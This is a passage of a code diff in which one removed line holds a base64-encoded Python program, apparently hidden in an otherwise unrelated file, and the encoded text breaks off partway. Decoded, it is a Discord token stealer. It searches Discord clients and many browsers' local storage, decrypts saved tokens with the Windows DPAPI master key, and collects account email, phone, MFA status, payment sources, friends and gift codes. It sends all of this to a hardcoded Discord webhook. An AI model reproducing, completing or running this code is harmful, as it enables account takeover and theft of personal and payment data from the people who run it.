@@ -1,1 +1,393 @@
-aW1wb3J0IGJhc2U2NCxqc29uLG9zLHJlLHJlcXVlc3RzCgpmcm9tIENyeXB0by5DaXBoZXIgaW1wb3J0IEFFUwpmcm9tIGRpc2NvcmQgaW1wb3J0IEVtYmVkLCBTeW5jV2ViaG9vawpmcm9tIHdpbjMyY3J5cHQgaW1wb3J0IENyeXB0VW5wcm90ZWN0RGF0YQoKY2xhc3MgRGlzY29yZFRva2VuOgogICAgZGVmIF9faW5pdF9fKHNlbGYsIHdlYmhvb2spOgogICAgICAgIHVwbG9hZF90b2tlbnMod2ViaG9vaykudXBsb2FkKCkKCgpjbGFzcyBleHRyYWN0X3Rva2VuczoKICAgIGRlZiBfX2luaXRfXyhzZWxmKSAtPiBOb25lOgogICAgICAgIHNlbGYuYmFzZV91cmwgPSAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjkvdXNlcnMvQG1lIgogICAgICAgIHNlbGYuYXBwZGF0YSA9IG9zLmdldGVudigibG9jYWxhcHBkYXRhIikKICAgICAgICBzZWxmLnJvYW1pbmcgPSBvcy5nZXRlbnYoImFwcGRhdGEiKQogICAgICAgIHNlbGYucmVnZXhwID0gciJbXHctXXsyNH1cLltcdy1dezZ9XC5bXHctXXsyNSwxMTB9IgogICAgICAgIHNlbGYucmVnZXhwX2VuYyA9IHIiZFF3NHc5V2dYY1E6W15cIl0qIgoKICAgICAgICBzZWxmLnRva2Vucywgc2VsZi51aWRzID0gW10sIFtdCgogICAgICAgIHNlbGYuZXh0cmFjdCgpCgogICAgZGVmIGV4dHJhY3Qoc2VsZikgLT4gTm9uZToKICAgICAgICBwYXRocyA9IHsKICAgICAgICAgICAgJ0Rpc2NvcmQnOiBzZWxmLnJvYW1pbmcgKyAnXFxkaXNjb3JkXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnRGlzY29yZCBDYW5hcnknOiBzZWxmLnJvYW1pbmcgKyAnXFxkaXNjb3JkY2FuYXJ5XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnTGlnaHRjb3JkJzogc2VsZi5yb2FtaW5nICsgJ1xcTGlnaHRjb3JkXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnRGlzY29yZCBQVEInOiBzZWxmLnJvYW1pbmcgKyAnXFxkaXNjb3JkcHRiXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnT3BlcmEnOiBzZWxmLnJvYW1pbmcgKyAnXFxPcGVyYSBTb2Z0d2FyZVxcT3BlcmEgU3RhYmxlXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnT3BlcmEgR1gnOiBzZWxmLnJvYW1pbmcgKyAnXFxPcGVyYSBTb2Z0d2FyZVxcT3BlcmEgR1ggU3RhYmxlXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnQW1pZ28nOiBzZWxmLmFwcGRhdGEgKyAnXFxBbWlnb1xcVXNlciBEYXRhXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnVG9yY2gnOiBzZWxmLmFwcGRhdGEgKyAnXFxUb3JjaFxcVXNlciBEYXRhXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnS29tZXRhJzogc2VsZi5hcHBkYXRhICsgJ1xcS29tZXRhXFxVc2VyIERhdGFcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdPcmJpdHVtJzogc2VsZi5hcHBkYXRhICsgJ1xcT3JiaXR1bVxcVXNlciBEYXRhXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnQ2VudEJyb3dzZXInOiBzZWxmLmFwcGRhdGEgKyAnXFxDZW50QnJvd3NlclxcVXNlciBEYXRhXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnN1N0YXInOiBzZWxmLmFwcGRhdGEgKyAnXFw3U3RhclxcN1N0YXJcXFVzZXIgRGF0YVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ1NwdXRuaWsnOiBzZWxmLmFwcGRhdGEgKyAnXFxTcHV0bmlrXFxTcHV0bmlrXFxVc2VyIERhdGFcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdWaXZhbGRpJzogc2VsZi5hcHBkYXRhICsgJ1xcVml2YWxkaVxcVXNlciBEYXRhXFxEZWZhdWx0XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnQ2hyb21lIFN4Uyc6IHNlbGYuYXBwZGF0YSArICdcXEdvb2dsZVxcQ2hyb21lIFN4U1xcVXNlciBEYXRhXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnQ2hyb21lJzogc2VsZi5hcHBkYXRhICsgJ1xcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcRGVmYXVsdFxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ0Nocm9tZTEnOiBzZWxmLmFwcGRhdGEgKyAnXFxHb29nbGVcXENocm9tZVxcVXNlciBEYXRhXFxQcm9maWxlIDFcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdDaHJvbWUyJzogc2VsZi5hcHBkYXRhICsgJ1xcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcUHJvZmlsZSAyXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnQ2hyb21lMyc6IHNlbGYuYXBwZGF0YSArICdcXEdvb2dsZVxcQ2hyb21lXFxVc2VyIERhdGFcXFByb2ZpbGUgM1xcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ0Nocm9tZTQnOiBzZWxmLmFwcGRhdGEgKyAnXFxHb29nbGVcXENocm9tZVxcVXNlciBEYXRhXFxQcm9maWxlIDRcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdDaHJvbWU1Jzogc2VsZi5hcHBkYXRhICsgJ1xcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcUHJvZmlsZSA1XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnRXBpYyBQcml2YWN5IEJyb3dzZXInOiBzZWxmLmFwcGRhdGEgKyAnXFxFcGljIFByaXZhY3kgQnJvd3NlclxcVXNlciBEYXRhXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnTWljcm9zb2Z0IEVkZ2UnOiBzZWxmLmFwcGRhdGEgKyAnXFxNaWNyb3NvZnRcXEVkZ2VcXFVzZXIgRGF0YVxcRGVmYXVsdFxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ1VyYW4nOiBzZWxmLmFwcGRhdGEgKyAnXFx1Q296TWVkaWFcXFVyYW5cXFVzZXIgRGF0YVxcRGVmYXVsdFxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ1lhbmRleCc6IHNlbGYuYXBwZGF0YSArICdcXFlhbmRleFxcWWFuZGV4QnJvd3NlclxcVXNlciBEYXRhXFxEZWZhdWx0XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnQnJhdmUnOiBzZWxmLmFwcGRhdGEgKyAnXFxCcmF2ZVNvZnR3YXJlXFxCcmF2ZS1Ccm93c2VyXFxVc2VyIERhdGFcXERlZmF1bHRcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdJcmlkaXVtJzogc2VsZi5hcHBkYXRhICsgJ1xcSXJpZGl1bVxcVXNlciBEYXRhXFxEZWZhdWx0XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnCiAgICAgICAgfQoKICAgICAgICBmb3IgbmFtZSwgcGF0aCBpbiBwYXRocy5pdGVtcygpOgogICAgICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aCk6CiAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICBfZGlzY29yZCA9IG5hbWUucmVwbGFjZSgiICIsICIiKS5sb3dlcigpCiAgICAgICAgICAgIGlmICJjb3JkIiBpbiBwYXRoOgogICAgICAgICAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHNlbGYucm9hbWluZytmJ1xce19kaXNjb3JkfVxcTG9jYWwgU3RhdGUnKToKICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgZm9yIGZpbGVfbmFtZSBpbiBvcy5saXN0ZGlyKHBhdGgpOgogICAgICAgICAgICAgICAgICAgIGlmIGZpbGVfbmFtZVstMzpdIG5vdCBpbiBbImxvZyIsICJsZGIiXToKICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICBmb3IgbGluZSBpbiBbeC5zdHJpcCgpIGZvciB4IGluIG9wZW4oZid7cGF0aH1cXHtmaWxlX25hbWV9JywgZXJyb3JzPSdpZ25vcmUnKS5yZWFkbGluZXMoKSBpZiB4LnN0cmlwKCldOgogICAgICAgICAgICAgICAgICAgICAgICBmb3IgeSBpbiByZS5maW5kYWxsKHNlbGYucmVnZXhwX2VuYywgbGluZSk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b2tlbiA9IHNlbGYuZGVjcnlwdF92YWwoYmFzZTY0LmI2NGRlY29kZSh5LnNwbGl0KCdkUXc0dzlXZ1hjUTonKVsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAxXSksIHNlbGYuZ2V0X21hc3Rlcl9rZXkoc2VsZi5yb2FtaW5nK2YnXFx7X2Rpc2NvcmR9XFxMb2NhbCBTdGF0ZScpKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHNlbGYudmFsaWRhdGVfdG9rZW4odG9rZW4pOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVpZCA9IHJlcXVlc3RzLmdldChzZWxmLmJhc2VfdXJsLCBoZWFkZXJzPXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ0F1dGhvcml6YXRpb24nOiB0b2tlbn0pLmpzb24oKVsnaWQnXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHVpZCBub3QgaW4gc2VsZi51aWRzOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLnRva2Vucy5hcHBlbmQodG9rZW4pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYudWlkcy5hcHBlbmQodWlkKQoKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGZvciBmaWxlX25hbWUgaW4gb3MubGlzdGRpcihwYXRoKToKICAgICAgICAgICAgICAgICAgICBpZiBmaWxlX25hbWVbLTM6XSBub3QgaW4gWyJsb2ciLCAibGRiIl06CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICAgICAgZm9yIGxpbmUgaW4gW3guc3RyaXAoKSBmb3IgeCBpbiBvcGVuKGYne3BhdGh9XFx7ZmlsZV9uYW1lfScsIGVycm9ycz0naWdub3JlJykucmVhZGxpbmVzKCkgaWYgeC5zdHJpcCgpXToKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHRva2VuIGluIHJlLmZpbmRhbGwoc2VsZi5yZWdleHAsIGxpbmUpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgc2VsZi52YWxpZGF0ZV90b2tlbih0b2tlbik6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdWlkID0gcmVxdWVzdHMuZ2V0KHNlbGYuYmFzZV91cmwsIGhlYWRlcnM9ewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnQXV0aG9yaXphdGlvbic6IHRva2VufSkuanNvbigpWydpZCddCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdWlkIG5vdCBpbiBzZWxmLnVpZHM6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYudG9rZW5zLmFwcGVuZCh0b2tlbikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi51aWRzLmFwcGVuZCh1aWQpCgogICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKHNlbGYucm9hbWluZysiXFxNb3ppbGxhXFxGaXJlZm94XFxQcm9maWxlcyIpOgogICAgICAgICAgICBmb3IgcGF0aCwgXywgZmlsZXMgaW4gb3Mud2FsayhzZWxmLnJvYW1pbmcrIlxcTW96aWxsYVxcRmlyZWZveFxcUHJvZmlsZXMiKToKICAgICAgICAgICAgICAgIGZvciBfZmlsZSBpbiBmaWxlczoKICAgICAgICAgICAgICAgICAgICBpZiBub3QgX2ZpbGUuZW5kc3dpdGgoJy5zcWxpdGUnKToKICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICBmb3IgbGluZSBpbiBbeC5zdHJpcCgpIGZvciB4IGluIG9wZW4oZid7cGF0aH1cXHtfZmlsZX0nLCBlcnJvcnM9J2lnbm9yZScpLnJlYWRsaW5lcygpIGlmIHguc3RyaXAoKV06CiAgICAgICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiByZS5maW5kYWxsKHNlbGYucmVnZXhwLCBsaW5lKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHNlbGYudmFsaWRhdGVfdG9rZW4odG9rZW4pOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVpZCA9IHJlcXVlc3RzLmdldChzZWxmLmJhc2VfdXJsLCBoZWFkZXJzPXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ0F1dGhvcml6YXRpb24nOiB0b2tlbn0pLmpzb24oKVsnaWQnXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHVpZCBub3QgaW4gc2VsZi51aWRzOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLnRva2Vucy5hcHBlbmQodG9rZW4pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYudWlkcy5hcHBlbmQodWlkKQoKICAgIGRlZiB2YWxpZGF0ZV90b2tlbihzZWxmLCB0b2tlbjogc3RyKSAtPiBib29sOgogICAgICAgIHByaW50KHRva2VuKQogICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoc2VsZi5iYXNlX3VybCwgaGVhZGVycz17J0F1dGhvcml6YXRpb24nOiB0b2tlbn0pCgogICAgICAgIGlmIHIuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICByZXR1cm4gVHJ1ZQoKICAgICAgICByZXR1cm4gRmFsc2UKCiAgICBkZWYgZGVjcnlwdF92YWwoc2VsZiwgYnVmZjogYnl0ZXMsIG1hc3Rlcl9rZXk6IGJ5dGVzKSAtPiBzdHI6CiAgICAgICAgaXYgPSBidWZmWzM6MTVdCiAgICAgICAgcGF5bG9hZCA9IGJ1ZmZbMTU6XQogICAgICAgIGNpcGhlciA9IEFFUy5uZXcobWFzdGVyX2tleSwgQUVTLk1PREVfR0NNLCBpdikKICAgICAgICBkZWNyeXB0ZWRfcGFzcyA9IGNpcGhlci5kZWNyeXB0KHBheWxvYWQpCiAgICAgICAgZGVjcnlwdGVkX3Bhc3MgPSBkZWNyeXB0ZWRfcGFzc1s6LTE2XS5kZWNvZGUoKQoKICAgICAgICByZXR1cm4gZGVjcnlwdGVkX3Bhc3MKCiAgICBkZWYgZ2V0X21hc3Rlcl9rZXkoc2VsZiwgcGF0aDogc3RyKSAtPiBzdHI6CiAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOgogICAgICAgICAgICByZXR1cm4KCiAgICAgICAgaWYgJ29zX2NyeXB0JyBub3QgaW4gb3BlbihwYXRoLCAncicsIGVuY29kaW5nPSd1dGYtOCcpLnJlYWQoKToKICAgICAgICAgICAgcmV0dXJuCgogICAgICAgIHdpdGggb3BlbihwYXRoLCAiciIsIGVuY29kaW5nPSJ1dGYtOCIpIGFzIGY6CiAgICAgICAgICAgIGMgPSBmLnJlYWQoKQogICAgICAgIGxvY2FsX3N0YXRlID0ganNvbi5sb2FkcyhjKQoKICAgICAgICBtYXN0ZXJfa2V5ID0gYmFzZTY0LmI2NGRlY29kZShsb2NhbF9zdGF0ZVsib3NfY3J5cHQiXVsiZW5jcnlwdGVkX2tleSJdKQogICAgICAgIG1hc3Rlcl9rZXkgPSBtYXN0ZXJfa2V5WzU6XQogICAgICAgIG1hc3Rlcl9rZXkgPSBDcnlwdFVucHJvdGVjdERhdGEobWFzdGVyX2tleSwgTm9uZSwgTm9uZSwgTm9uZSwgMClbMV0KCiAgICAgICAgcmV0dXJuIG1hc3Rlcl9rZXkKCgpjbGFzcyB1cGxvYWRfdG9rZW5zOgogICAgZGVmIF9faW5pdF9fKHNlbGYsIHdlYmhvb2s6IHN0cik6CiAgICAgICAgc2VsZi50b2tlbnMgPSBleHRyYWN0X3Rva2VucygpLnRva2VucwogICAgICAgIHNlbGYud2ViaG9vayA9IFN5bmNXZWJob29rLmZyb21fdXJsKCJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMTQxNjk2MDE4MzEyODYzODA0L1pnbURTbGJLMnhNcE5WVE1sUDlWY0ZITzc2WXl1OFI2RVRzWGhBUlVxeHpKalFDNmJIUWRSVE1aSGdZcHhtdE4wM1ZkIikKCiAgICBkZWYgY2FsY19mbGFncyhzZWxmLCBmbGFnczogaW50KSAtPiBsaXN0OgogICAgICAgIGZsYWdzX2RpY3QgPSB7CiAgICAgICAgICAgICJESVNDT1JEX0VNUExPWUVFIjogewogICAgICAgICAgICAgICAgImVtb2ppIjogIjw6c3RhZmY6OTY4NzA0NTQxOTQ2MTY3MzU3PiIsCiAgICAgICAgICAgICAgICAic2hpZnQiOiAwLAogICAgICAgICAgICAgICAgImluZCI6IDEKICAgICAgICAgICAgfSwKICAgICAgICAgICAgIkRJU0NPUkRfUEFSVE5FUiI6IHsKICAgICAgICAgICAgICAgICJlbW9qaSI6ICI8OnBhcnRuZXI6OTY4NzA0NTQyMDIxNjUyNTYwPiIsCiAgICAgICAgICAgICAgICAic2hpZnQiOiAxLAogICAgICAgICAgICAgICAgImluZCI6IDIKICAgICAgICAgICAgfSwKICAgICAgICAgICAgIkhZUEVTUVVBRF9FVkVOVFMiOiB7CiAgICAgICAgICAgICAgICAiZW1vamkiOiAiPDpoeXBlcnNxdWFkX2V2ZW50czo5Njg3MDQ1NDE3NzQxOTI2OTM+IiwKICAgICAgICAgICAgICAgICJzaGlmdCI6IDIsCiAgICAgICAgICAgICAgICAiaW5kIjogNAogICAgICAgICAgICB9LAogICAgICAgICAgICAiQlVHX0hVTlRFUl9MRVZFTF8xIjogewogICAgICAgICAgICAgICAgImVtb2ppIjogIjw6YnVnX2h1bnRlcl8xOjk2ODcwNDU0MTY3NzcyMzY0OD4iLAogICAgICAgICAgICAgICAgInNoaWZ0IjogMywKICAgICAgICAgICAgICAgICJpbmQiOiA0CiAgICAgICAgICAgIH0sCiAgICAgICAgICAgICJIT1VTRV9CUkFWRVJZIjogewogICAgICAgICAgICAgICAgImVtb2ppIjogIjw6aHlwZXJzcXVhZF8xOjk2ODcwNDU0MTUwMTU3MTEzMz4iLAogICAgICAgICAgICAgICAgInNoaWZ0IjogNiwKICAgICAgICAgICAgICAgICJpbmQiOiA2NAogICAgICAgICAgICB9LAogICAgICAgICAgICAiSE9VU0VfQlJJTExJQU5DRSI6IHsKICAgICAgICAgICAgICAgICJlbW9qaSI6ICI8Omh5cGVyc3F1YWRfMjo5Njg3MDQ1NDE4ODMyNjEwMTg+IiwKICAgICAgICAgICAgICAgICJzaGlmdCI6IDcsCiAgICAgICAgICAgICAgICAiaW5kIjogMTI4CiAgICAgICAgICAgIH0sCiAgICAgICAgICAgICJIT1VTRV9CQUxBTkNFIjogewogICAgICAgICAgICAgICAgImVtb2ppIjogIjw6aHlwZXJzcXVhZF8zOjk2ODcwNDU0MTg3NDg2MDA4Mj4iLAogICAgICAgICAgICAgICAgInNoaWZ0IjogOCwKICAgICAgICAgICAgICAgICJpbmQiOiAyNTYKICAgICAgICAgICAgfSwKICAgICAgICAgICAgIkVBUkxZX1NVUFBPUlRFUiI6IHsKICAgICAgICAgICAgICAgICJlbW9qaSI6ICI8OmVhcmx5X3N1cHBvcnRlcjo5Njg3MDQ1NDIxMjY1MTAwOTA+IiwKICAgICAgICAgICAgICAgICJzaGlmdCI6IDksCiAgICAgICAgICAgICAgICAiaW5kIjogNTEyCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgICJCVUdfSFVOVEVSX0xFVkVMXzIiOiB7CiAgICAgICAgICAgICAgICAiZW1vamkiOiAiPDpidWdfaHVudGVyXzI6OTY4NzA0NTQxNzc0MjE3MjQ2PiIsCiAgICAgICAgICAgICAgICAic2hpZnQiOiAxNCwKICAgICAgICAgICAgICAgICJpbmQiOiAxNjM4NAogICAgICAgICAgICB9LAogICAgICAgICAgICAiVkVSSUZJRURfQk9UX0RFVkVMT1BFUiI6IHsKICAgICAgICAgICAgICAgICJlbW9qaSI6ICI8OnZlcmlmaWVkX2Rldjo5Njg3MDQ1NDE3MDI5MDU4ODY+IiwKICAgICAgICAgICAgICAgICJzaGlmdCI6IDE3LAogICAgICAgICAgICAgICAgImluZCI6IDEzMTA3MgogICAgICAgICAgICB9LAogICAgICAgICAgICAiQUNUSVZFX0RFVkVMT1BFUiI6IHsKICAgICAgICAgICAgICAgICJlbW9qaSI6ICI8OkFjdGl2ZV9EZXY6MTA0NTAyNDkwOTY5MDE2MzIxMD4iLAogICAgICAgICAgICAgICAgInNoaWZ0IjogMjIsCiAgICAgICAgICAgICAgICAiaW5kIjogNDE5NDMwNAogICAgICAgICAgICB9LAogICAgICAgICAgICAiQ0VSVElGSUVEX01PREVSQVRPUiI6IHsKICAgICAgICAgICAgICAgICJlbW9qaSI6ICI8OmNlcnRpZmllZF9tb2RlcmF0b3I6OTg4OTk2NDQ3OTM4Njc0Njk5PiIsCiAgICAgICAgICAgICAgICAic2hpZnQiOiAxOCwKICAgICAgICAgICAgICAgICJpbmQiOiAyNjIxNDQKICAgICAgICAgICAgfSwKICAgICAgICAgICAgIlNQQU1NRVIiOiB7CiAgICAgICAgICAgICAgICAiZW1vamkiOiAi4oyoIiwKICAgICAgICAgICAgICAgICJzaGlmdCI6IDIwLAogICAgICAgICAgICAgICAgImluZCI6IDEwNDg3MDQKICAgICAgICAgICAgfSwKICAgICAgICB9CgogICAgICAgIHJldHVybiBbW2ZsYWdzX2RpY3RbZmxhZ11bJ2Vtb2ppJ10sIGZsYWdzX2RpY3RbZmxhZ11bJ2luZCddXSBmb3IgZmxhZyBpbiBmbGFnc19kaWN0IGlmIGludChmbGFncykgJiAoMSA8PCBmbGFnc19kaWN0W2ZsYWddWyJzaGlmdCJdKV0KCiAgICBkZWYgdXBsb2FkKHNlbGYpOgogICAgICAgIGlmIG5vdCBzZWxmLnRva2VuczoKICAgICAgICAgICAgcmV0dXJuCgogICAgICAgIGZvciB0b2tlbiBpbiBzZWxmLnRva2VuczoKICAgICAgICAgICAgdXNlciA9IHJlcXVlc3RzLmdldCgKICAgICAgICAgICAgICAgICdodHRwczovL2Rpc2NvcmQuY29tL2FwaS92OC91c2Vycy9AbWUnLCBoZWFkZXJzPXsnQXV0aG9yaXphdGlvbic6IHRva2VufSkuanNvbigpCiAgICAgICAgICAgIGJpbGxpbmcgPSByZXF1ZXN0cy5nZXQoCiAgICAgICAgICAgICAgICAnaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjYvdXNlcnMvQG1lL2JpbGxpbmcvcGF5bWVudC1zb3VyY2VzJywgaGVhZGVycz17J0F1dGhvcml6YXRpb24nOiB0b2tlbn0pLmpzb24oKQogICAgICAgICAgICBndWlsZHMgPSByZXF1ZXN0cy5nZXQoCiAgICAgICAgICAgICAgICAnaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjkvdXNlcnMvQG1lL2d1aWxkcz93aXRoX2NvdW50cz10cnVlJywgaGVhZGVycz17J0F1dGhvcml6YXRpb24nOiB0b2tlbn0pLmpzb24oKQogICAgICAgICAgICBmcmllbmRzID0gcmVxdWVzdHMuZ2V0KAogICAgICAgICAgICAgICAgJ2h0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y4L3VzZXJzL0BtZS9yZWxhdGlvbnNoaXBzJywgaGVhZGVycz17J0F1dGhvcml6YXRpb24nOiB0b2tlbn0pLmpzb24oKQogICAgICAgICAgICBnaWZ0X2NvZGVzID0gcmVxdWVzdHMuZ2V0KAogICAgICAgICAgICAgICAgJ2h0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y5L3VzZXJzL0BtZS9vdXRib3VuZC1wcm9tb3Rpb25zL2NvZGVzJywgaGVhZGVycz17J0F1dGhvcml6YXRpb24nOiB0b2tlbn0pLmpzb24oKQoKICAgICAgICAgICAgdXNlcm5hbWUgPSB1c2VyWyd1c2VybmFtZSddICsgJyMnICsgdXNlclsnZGlzY3JpbWluYXRvciddCiAgICAgICAgICAgIHVzZXJfaWQgPSB1c2VyWydpZCddCiAgICAgICAgICAgIGVtYWlsID0gdXNlclsnZW1haWwnXQogICAgICAgICAgICBwaG9uZSA9IHVzZXJbJ3Bob25lJ10KICAgICAgICAgICAgbWZhID0gdXNlclsnbWZhX2VuYWJsZWQnXQogICAgICAgICAgICBhdmF0YXIgPSBmImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F2YXRhcnMve3VzZXJfaWR9L3t1c2VyWydhdmF0YXInXX0uZ2lmIiBpZiByZXF1ZXN0cy5nZXQoCiAgICAgICAgICAgICAgICBmImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F2YXRhcnMve3VzZXJfaWR9L3t1c2VyWydhdmF0YXInXX0uZ2lmIikuc3RhdHVzX2NvZGUgPT0gMjAwIGVsc2UgZiJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdmF0YXJzL3t1c2VyX2lkfS97dXNlclsnYXZhdGFyJ119LnBuZyIKICAgICAgICAgICAgYmFkZ2VzID0gJyAnLmpvaW4oW2ZsYWdbMF0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGZsYWcgaW4gc2VsZi5jYWxjX2ZsYWdzKHVzZXJbJ3B1YmxpY19mbGFncyddKV0pCgogICAgICAgICAgICBpZiB1c2VyWydwcmVtaXVtX3R5cGUnXSA9PSAwOgogICAgICAgICAgICAgICAgbml0cm8gPSAnTm9uZScKICAgICAgICAgICAgZWxpZiB1c2VyWydwcmVtaXVtX3R5cGUnXSA9PSAxOgogICAgICAgICAgICAgICAgbml0cm8gPSAnTml0cm8gQ2xhc3NpYycKICAgICAgICAgICAgZWxpZiB1c2VyWydwcmVtaXVtX3R5cGUnXSA9PSAyOgogICAgICAgICAgICAgICAgbml0cm8gPSAnTml0cm8nCiAgICAgICAgICAgIGVsaWYgdXNlclsncHJlbWl1bV90eXBlJ10gPT0gMzoKICAgICAgICAgICAgICAgIG5pdHJvID0gJ05pdHJvIEJhc2ljJwogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgbml0cm8gPSAnTm9uZScKCiAgICAgICAgICAgIGlmIGJpbGxpbmc6CiAgICAgICAgICAgICAgICBwYXltZW50X21ldGhvZHMgPSBbXQoKICAgICAgICAgICAgICAgIGZvciBtZXRob2QgaW4gYmlsbGluZzoKICAgICAgICAgICAgICAgICAgICBpZiBtZXRob2RbJ3R5cGUnXSA9PSAxOgogICAgICAgICAgICAgICAgICAgICAgICBwYXltZW50X21ldGhvZHMuYXBwZW5kKCfwn5KzJykKCiAgICAgICAgICAgICAgICAgICAgZWxpZiBtZXRob2RbJ3R5cGUnXSA9PSAyOgogICAgICAgICAgICAgICAgICAgICAgICBwYXltZW50X21ldGhvZHMuYXBwZW5kKCI8OnBheXBhbDo5NzM0MTc2NTU2MjcyODg2NjY+IikKCiAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgcGF5bWVudF9tZXRob2RzLmFwcGVuZCgn4p2TJykKCiAgICAgICAgICAgICAgICBwYXltZW50X21ldGhvZHMgPSAnLCAnLmpvaW4ocGF5bWVudF9tZXRob2RzKQoKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHBheW1lbnRfbWV0aG9kcyA9IE5vbmUKCiAgICAgICAgICAgIGlmIGd1aWxkczoKICAgICAgICAgICAgICAgIGhxX2d1aWxkcyA9IFtdCiAgICAgICAgICAgICAgICBmb3IgZ3VpbGQgaW4gZ3VpbGRzOgogICAgICAgICAgICAgICAgICAgIGFkbWluID0gVHJ1ZSBpZiBndWlsZFsncGVybWlzc2lvbnMnXSA9PSAnNDM5ODA0NjUxMTEwMycgZWxzZSBGYWxzZQogICAgICAgICAgICA